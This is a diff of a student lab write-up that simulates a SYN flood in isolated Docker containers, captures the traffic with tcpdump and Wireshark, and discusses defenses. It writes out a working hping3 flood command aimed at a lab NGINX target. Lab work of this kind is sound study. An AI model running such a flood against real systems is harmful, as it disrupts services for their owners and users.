@@ -1,7 +1,7 @@
-# SYN Flood Attack Simulation with Docker
+# SYN Flood Attack Simulation with Docker: Lab Setup and Traffic Analysis
 
-**Lab Setup and Traffic Analysis**  
-*Erwin Bruno - July 26, 2025*  
+**Hands-on experience with SYN flood attacks and network traffic analysis**  
+*Erwin Bruno - July 26, 2026*  
 *Secure Network Engineering (CYBR-508-02P)*
 
 ## Objective
@@ -10,91 +10,87 @@ This lab provides hands-on experience with SYN flood attacks, a common form of D
 
 ## Prerequisites
 
-- Docker installed and running
-- Wireshark installed on host machine
-- Basic understanding of TCP/IP networking
+- Docker Desktop installed and running
+- Wireshark installed on host system
+- Basic understanding of TCP/IP protocols
+- Command line familiarity (bash/terminal)
 - Administrative privileges for Docker operations
+- Windows/Linux/macOS host system
 
 ## Lab Setup
 
-### 1. Create Docker Network
-
+### Create Docker Network
+Create a custom bridge network for isolated testing:
 ```bash
 docker network create --driver bridge syn_flood_network
 ```
 
-### 2. Set Up Target Container (NGINX)
-
-Create the target container with limited resources:
+### Deploy Target Container
+Create NGINX target with resource constraints:
 ```bash
 docker run -dit --name target --network syn_flood_network --cpus="0.2" --memory="256m" --cap-add=NET_ADMIN nginx
 ```
 
+### Configure Target Environment
 Enter the target container:
 ```bash
 docker exec -it target bash
 ```
 
-Inside the target container, update and install tools:
+Update and install required tools:
 ```bash
 apt update && apt install iproute2 -y
 ```
 
-Throttle bandwidth:
+Apply bandwidth throttling:
 ```bash
 tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
 ```
 
-Prepare directory and install tcpdump:
+Prepare capture directory and install tcpdump:
 ```bash
 mkdir -p /mnt/data
 apt update && apt install tcpdump -y
 ```
 
-### 3. Set Up Attacker Container
-
+### Deploy Attacker Container
 Create and enter the attacker container:
 ```bash
 docker run -it --name attacker --network syn_flood_network ubuntu /bin/bash
 ```
 
-Inside the attacker container, install hping3:
+Install attack tools:
 ```bash
 apt update && apt install hping3 -y
 ```
 
 ## Attack Execution
 
-### Launch the SYN Flood Attack
-
-Open a new terminal and run inside the attacker container:
+### Launch SYN Flood Attack
+From inside the attacker container, execute the flood:
 ```bash
 hping3 --flood --syn --destport 80 target
 ```
 
-## Packet Capture
-
-### Capture Traffic on Target
-
-In the target container, start tcpdump:
+### Packet Capture (Target Container)
+In a separate terminal, capture SYN packets on target:
 ```bash
 tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' and not port 22 -w /mnt/data/syn_flood_capture.pcap
 ```
 
 Stop capture with `Ctrl+C` when sufficient data is collected.
 
-### Download and Analyze
-
-Copy the PCAP file from container to host (replace `{Username}` with your username):
+### Traffic Analysis
+Copy PCAP file to host system (replace `{Username}` with actual username):
 ```bash
-docker cp target:/mnt/data/syn_flood_capture.pcap C:\Users\{Username}\Downloads\
+docker cp target:/mnt/data/syn_flood_capture.pcap C:\Users\{Username}\Downloads
 ```
 
-Open `syn_flood_capture.pcap` with Wireshark for analysis.
+Open the captured file with Wireshark for detailed analysis.
 
 ## Cleanup
 
-Stop and remove containers and network:
+Remove all lab components:
 ```bash
 docker container stop target attacker
 docker container rm target attacker
@@ -103,76 +99,53 @@ docker network rm syn_flood_network
 
 ## Results and Observations
 
-The SYN flood attack successfully demonstrated service disruption. Wireshark analysis revealed:
-
-- **Continuous SYN packet transmission** with no corresponding SYN-ACK responses
-- **Connection table exhaustion** confirmed through traffic patterns
-- **Disrupted TCP three-way handshake** process
-- **Resource consumption** from managing half-open connections
-- **Impact on legitimate traffic** due to connection table exhaustion
+The SYN flood attack successfully demonstrated service disruption through connection table exhaustion. Wireshark analysis revealed continuous SYN packet transmission with no corresponding SYN-ACK responses, confirming the attack's effectiveness.
 
 ### Key Findings
-
-- Connection attempts from attacker were not properly completed
-- TCP three-way handshake process was disrupted
-- Server resources were consumed managing half-open connections
-- Legitimate traffic would be impacted due to connection table exhaustion
+* Connection attempts from attacker were not properly completed
+* TCP three-way handshake process was disrupted
+* Server resources were consumed managing half-open connections
+* Legitimate traffic would be impacted due to connection table exhaustion
+* Continuous SYN packets observed without proper connection establishment
 
 ## Real-World Implications
 
-### Attack Characteristics
-
-SYN flood attacks pose significant threats to network infrastructure because:
-
-- They require **minimal resources from the attacker**
-- They can **overwhelm servers** with limited connection handling capacity
-- They are **difficult to distinguish** from legitimate high-traffic periods initially
-- **Small devices and budget servers** are particularly vulnerable
+### Network Infrastructure Threats
+SYN flood attacks pose significant threats because they require minimal attacker resources while overwhelming servers with limited connection handling capacity. They are difficult to distinguish from legitimate high-traffic periods initially.
 
 ### Organizations at Risk
-
-- **Small businesses** with limited server resources
-- **IoT device manufacturers** with minimal security implementations
-- **Legacy systems** without modern TCP stack protections
-- **Services without proper rate limiting** or DDoS protection
+* Small businesses with limited server resources
+* IoT device manufacturers with minimal security implementations
+* Legacy systems without modern TCP stack protections
+* Services without proper rate limiting or DDoS protection
 
 ### Business Impact
-
-Successful SYN flood attacks can result in:
-
-- Service unavailability during peak business hours
-- Revenue loss for e-commerce platforms
-- Customer dissatisfaction and reputation damage
-- Increased operational costs for incident response
+Successful SYN flood attacks can result in service unavailability during peak business hours, revenue loss for e-commerce platforms, customer dissatisfaction and reputation damage, and increased operational costs for incident response.
 
 ## Defense Strategies
 
 ### Technical Mitigations
-
-- **SYN Cookies** - Allow servers to handle connections without storing state
-- **Rate Limiting** - Block suspicious traffic patterns
-- **Timeout Tuning** - Reduce connection timeout values
-- **Firewall Rules** - iptables and cloud-based DDoS protection
+* **SYN Cookies**: Enable SYN cookie functionality to handle connection state without memory allocation
+* **Rate Limiting**: Implement connection rate limits per source IP
+* **Timeout Reduction**: Decrease SYN_RECV timeout values to free resources faster
+* **iptables Rules**: Configure firewall rules to detect and block flood patterns
 
 ### Infrastructure Solutions
-
-- Load balancers with traffic filtering
-- Cloud-based DDoS protection services
-- Network monitoring and alerting systems
-- Proper resource allocation and scaling
+* **Load Balancers**: Deploy reverse proxies with DDoS protection capabilities
+* **Cloud Security**: Utilize cloud-based DDoS mitigation services
+* **Network Monitoring**: Implement real-time traffic analysis and alerting
+* **Resource Scaling**: Design systems with auto-scaling capabilities
 
 ## Educational Value
 
 This lab demonstrates:
-
-- Practical attack execution in controlled environment
-- Network traffic analysis techniques
-- Real-world security implications
-- Defensive strategy development
-- Docker containerization for security testing
+* **Attack Methodology**: Understanding how SYN flood attacks exploit TCP protocol weaknesses
+* **Traffic Analysis**: Developing skills in packet capture and analysis using industry-standard tools
+* **Containerization**: Utilizing Docker for safe, isolated security testing environments
+* **Network Security**: Recognizing DoS attack patterns and their impact on network infrastructure
+* **Defensive Thinking**: Understanding attack vectors to implement appropriate countermeasures
 
 ## Disclaimer
 
-⚠️ **For Educational Purposes Only**
-
-This lab is designed for educational purposes in controlled environments. Do not use these techniques against systems you do not own or without explicit permission. Unauthorized network attacks are illegal and unethical.
+⚠️ **For Educational Purposes Only**  
+This lab is designed for educational and authorized testing environments only. SYN flood attacks are illegal when performed against systems without explicit permission. Always ensure you have proper authorization before conducting any security testing. Use this knowledge responsibly to improve defensive security postures.
